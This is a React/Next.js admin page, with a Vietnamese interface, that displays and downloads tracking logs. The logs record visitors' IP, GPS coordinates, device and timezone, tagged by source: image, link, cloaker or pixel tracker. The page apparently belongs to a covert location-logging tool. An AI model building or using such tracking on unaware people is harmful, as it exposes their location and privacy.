
"use client"

import * as React from "react"
import { SidebarProvider, SidebarInset, SidebarTrigger } from "@/components/ui/sidebar"
import { AppSidebar } from "@/components/layout/app-sidebar"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { FileText, RefreshCw, Download, Trash2, Link as LinkIcon, Image as ImageIcon, MapPin, ExternalLink, Binary, Package } from 'lucide-react'
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { ScrollArea } from '@/components/ui/scroll-area'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { getParsedLogsAction, deleteLogsAction, type LogEntry } from "@/app/actions/logs"
import { useToast } from "@/hooks/use-toast"
import { useRouter } from "next/navigation"
import { MapPreviewPopup } from "@/components/map-preview-popup"
import { getCurrentUserAction } from "@/app/actions/users"

export default function AdminPage() {
  const [parsedLogs, setParsedLogs] = React.useState<LogEntry[]>([])
  const [loading, setLoading] = React.useState(true)
  const [autoRefresh, setAutoRefresh] = React.useState(true)
  const { toast } = useToast()
  const router = useRouter()
  const [logContentForDownload, setLogContentForDownload] = React.useState('');

  // Protect page
  React.useEffect(() => {
    async function checkAuth() {
        const user = await getCurrentUserAction();
        if (!user || !user.permissions?.includes('admin')) {
            toast({ title: 'Truy cập bị từ chối', description: 'Bạn không có quyền truy cập trang này.', variant: 'destructive' });
            router.replace('/dashboard');
        }
    }
    checkAuth();
  }, [router, toast]);

  const fetchLogs = React.useCallback(async () => {
    const { logs, rawContent } = await getParsedLogsAction()
    setParsedLogs(logs)
    setLogContentForDownload(rawContent);
    setLoading(false)
  }, [])

  React.useEffect(() => {
    fetchLogs()
    let interval: any
    if (autoRefresh) {
      interval = setInterval(fetchLogs, 5000) // Changed from 2000ms to 5000ms
    }
    return () => clearInterval(interval)
  }, [fetchLogs, autoRefresh])

  const handleDownload = () => {
    const blob = new Blob([logContentForDownload], { type: 'text/plain;charset=utf-8' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = 'tracking_logs.txt'
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
  }

  const handleDelete = async () => {
    if (window.confirm("Bạn có chắc chắn muốn xóa tất cả nhật ký truy cập không? Hành động này không thể hoàn tác.")) {
      setLoading(true)
      const result = await deleteLogsAction()
      if (result.success) {
        toast({
          title: "Thành công",
          description: result.message,
        })
        await fetchLogs()
      } else {
        toast({
          variant: "destructive",
          title: "Lỗi",
          description: result.message,
        })
        setLoading(false)
      }
    }
  }

  return (
    <SidebarProvider>
      <AppSidebar />
      <SidebarInset>
        <header className="flex h-16 shrink-0 items-center gap-2 border-b px-4">
          <SidebarTrigger />
          <h1 className="text-xl font-bold font-headline">Nhật ký truy cập</h1>
          <div className="ml-auto flex items-center gap-2">
             <Button 
              variant={autoRefresh ? "secondary" : "outline"} 
              size="sm" 
              className="gap-2"
              onClick={() => setAutoRefresh(!autoRefresh)}
            >
              <RefreshCw className={`h-4 w-4 ${autoRefresh ? "animate-spin" : ""}`} /> 
              {autoRefresh ? "Tự động làm mới" : "Làm mới thủ công"}
            </Button>
            <Button variant="outline" size="sm" onClick={handleDownload} disabled={loading || parsedLogs.length === 0}>
              <Download className="h-4 w-4" />
               <span className="ml-2 hidden sm:inline">Tải xuống</span>
            </Button>
            <Button variant="destructive" size="sm" onClick={handleDelete} disabled={loading || parsedLogs.length === 0}>
              <Trash2 className="h-4 w-4" />
               <span className="ml-2 hidden sm:inline">Xóa Nhật ký</span>
            </Button>
          </div>
        </header>
        <main className="flex-1 p-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <FileText className="h-5 w-5" />
                  Toàn bộ nhật ký từ logs/tracking_logs.txt
                </div>
                <Badge variant="outline">Tổng: {parsedLogs.length} lượt</Badge>
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="border rounded-md">
                <ScrollArea className="h-[68vh]">
                    <Table>
                        <TableHeader className="sticky top-0 bg-muted/50 backdrop-blur-sm z-10">
                            <TableRow>
                                <TableHead className="w-[180px]">Thời gian</TableHead>
                                <TableHead>Địa chỉ IP</TableHead>
                                <TableHead>Địa chỉ / Vị trí</TableHead>
                                <TableHead className="hidden lg:table-cell">Thiết bị</TableHead>
                            </TableRow>
                        </TableHeader>
                        <TableBody>
                            {loading ? (
                                <TableRow>
                                <TableCell colSpan={4} className="text-center h-48 text-muted-foreground">
                                    Đang tải nhật ký...
                                </TableCell>
                                </TableRow>
                            ) : parsedLogs.length > 0 ? (
                                parsedLogs.map((log, index) => {
                                    const coords = log.coordinates.split(', ');
                                    const lat = coords.length > 1 ? coords[0] : null;
                                    const lon = coords.length > 1 ? coords[1] : null;

                                    return (
                                    <TableRow key={index}>
                                        <TableCell className="font-mono text-xs">{log.timestamp}</TableCell>
                                        <TableCell className="font-mono text-xs">
                                            <div className="flex items-center gap-2">
                                                <span>{log.ip}</span>
                                                {log.source === 'image' && <Badge variant="secondary" className="gap-1"><ImageIcon className="h-3 w-3" />Ảnh</Badge>}
                                                {log.source === 'link' && <Badge variant="outline" className="gap-1"><LinkIcon className="h-3 w-3"/>Link</Badge>}
                                                {log.source === 'cloaker' && <Badge variant="default" className="gap-1 bg-orange-500 hover:bg-orange-600 text-white"><Package className="h-3 w-3"/>Bọc</Badge>}
                                                {log.source === 'pixel_tracker' && <Badge variant="destructive" className="gap-1"><Binary className="h-3 w-3"/>Pixel</Badge>}
                                            </div>
                                        </TableCell>
                                        <TableCell className="text-sm">
                                            <div className="font-medium truncate max-w-xs">{log.address}</div>
                                            {log.redirectUrl && log.redirectUrl !== 'N/A' ? (
                                                <a
                                                    href={log.redirectUrl}
                                                    target="_blank"
                                                    rel="noopener noreferrer"
                                                    title="Truy cập link chuyển hướng"
                                                    className="text-xs text-muted-foreground hover:text-primary flex items-center gap-1"
                                                >
                                                    <ExternalLink className="h-3 w-3" />
                                                    <span className="truncate">Chuyển hướng: {log.redirectUrl}</span>
                                                </a>
                                            ) : lat && lon && log.mapLink !== 'N/A' ? (
                                                <div className="flex items-center gap-2">
                                                    <MapPreviewPopup
                                                        lat={lat}
                                                        lon={lon}
                                                        address={log.address}
                                                        trigger={
                                                            <button className="text-xs text-muted-foreground font-mono cursor-pointer hover:text-primary flex items-center gap-1 w-fit text-left">
                                                                <MapPin className="h-3 w-3" />
                                                                <span>{log.coordinates} (acc: {log.accuracy})</span>
                                                            </button>
                                                        }
                                                    />
                                                    <a
                                                      href={log.mapLink}
                                                      target="_blank"
                                                      rel="noopener noreferrer"
                                                      title="Mở trong tab mới"
                                                      className="text-muted-foreground hover:text-primary"
                                                    >
                                                        <ExternalLink className="h-3.5 w-3.5" />
                                                    </a>
                                                </div>
                                            ) : (
                                                    <div className="text-xs text-muted-foreground italic">Không có dữ liệu vị trí</div>
                                            )}
                                        </TableCell>
                                        <TableCell className="hidden lg:table-cell text-xs text-muted-foreground truncate max-w-sm">
                                            <div className="truncate">{log.device}</div>
                                            {(log.language !== 'N/A' || log.timezone !== 'N/A') && (
                                              <div className="text-muted-foreground/80 truncate" title={`${log.language} (${log.timezone})`}>
                                                  {log.language} ({log.timezone})
                                              </div>
                                            )}
                                        </TableCell>
                                    </TableRow>
                                )})
                            ) : (
                                <TableRow>
                                    <TableCell colSpan={4} className="text-center h-48 text-muted-foreground">
                                        Nhật ký trống.
                                    </TableCell>
                                </TableRow>
                            )}
                        </TableBody>
                    </Table>
                </ScrollArea>
              </div>
            </CardContent>
          </Card>
        </main>
      </SidebarInset>
    </SidebarProvider>
  )
}

    